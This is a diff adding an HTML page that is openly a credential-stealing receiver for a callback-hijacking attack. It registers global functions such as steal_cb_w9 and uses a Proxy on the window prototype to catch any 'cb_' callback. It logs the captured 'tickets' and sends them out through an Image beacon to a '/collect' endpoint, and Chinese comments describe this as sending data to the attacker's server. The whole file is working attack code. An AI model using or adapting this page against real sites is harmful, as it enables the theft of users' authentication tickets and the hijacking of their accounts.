@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Recv</title></head>
+<body>
+<h2 id="status">Waiting for ticket callback...</h2>
+<pre id="result" style="font-size:11px;max-height:80vh;overflow:auto;color:red;"></pre>
+<script>
+var result = document.getElementById('result');
+var status = document.getElementById('status');
+var captured = {};
+
+function onCapture(name, data) {
+    captured[name] = data;
+    var text = '[' + Date.now() + '] ★ CAPTURED ' + name + ':\n' + data + '\n\n';
+    result.textContent += text;
+    status.textContent = 'TICKET CAPTURED!';
+    status.style.color = 'red';
+    // 外传到攻击者服务器（这里只打印，实际可用 fetch/Image）
+    try {
+        var img = new Image();
+        img.src = '/collect?name=' + encodeURIComponent(name) + '&data=' + encodeURIComponent(data).substring(0, 2000);
+    } catch(e) {}
+}
+
+// 定义所有已知的 callback 函数名
+window.steal_cb_w9 = function(data) { onCapture('W9_ticket', data); };
+window.steal_cb_w10 = function(data) { onCapture('W10_ticket', data); };
+window.steal_cb_w14 = function(data) { onCapture('W14_ticket', data); };
+window.steal_cb_page = function(data) { onCapture('page_ticket', data); };
+window.steal_cb_load = function(data) { onCapture('loadurl_result', data); };
+
+// 通配：用 Proxy 捕获任何 cb_ 开头的全局函数调用
+try {
+    window.__proto__ = new Proxy(window.__proto__, {
+        get: function(target, name) {
+            if (typeof name === 'string' && name.startsWith('cb_')) {
+                return function(data) { onCapture(name, data); };
+            }
+            return Reflect.get(target, name);
+        }
+    });
+} catch(e) {
+    // Proxy 不可用时的降级
+    result.textContent += '[warn] Proxy not available: ' + e.message + '\n';
+}
+
+result.textContent += '[' + Date.now() + '] recv.html loaded, callbacks registered\n';
+result.textContent += 'URL: ' + location.href + '\n\n';
+</script>
+</body>
+</html>
